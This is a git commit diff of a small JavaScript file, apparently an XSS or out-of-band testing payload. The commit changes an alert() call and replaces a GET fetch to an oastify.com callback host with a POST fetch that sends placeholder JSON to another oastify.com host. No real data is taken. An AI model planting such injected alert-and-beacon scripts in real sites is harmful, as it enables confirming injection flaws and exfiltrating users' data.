492fa4bd8352e07fa12643053ded48b3086534b4
Imran nissar <38746061+imrannissar@users.noreply.github.com>
2024-01-25 11:01:04 +0530

    asd

--- a.js
+++ a.js
@@ -1,5 +1,14 @@
-alert(0),
-fetch("https://b4glctqeaewg0fw84mimbi4r3i9fx6lv.oastify.com")
-  .then(response => response.text())
+alert(1),
+fetch("https://znq9vh92t2f4j3fwna1au6nfm6s4gu4j.oastify.com/", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    Test: "Test1",
+    key2: "value2",
+  }),
+})
+  .then(response => response.json())
   .then(data => console.log(data))
   .catch(error => console.error('Error:', error));
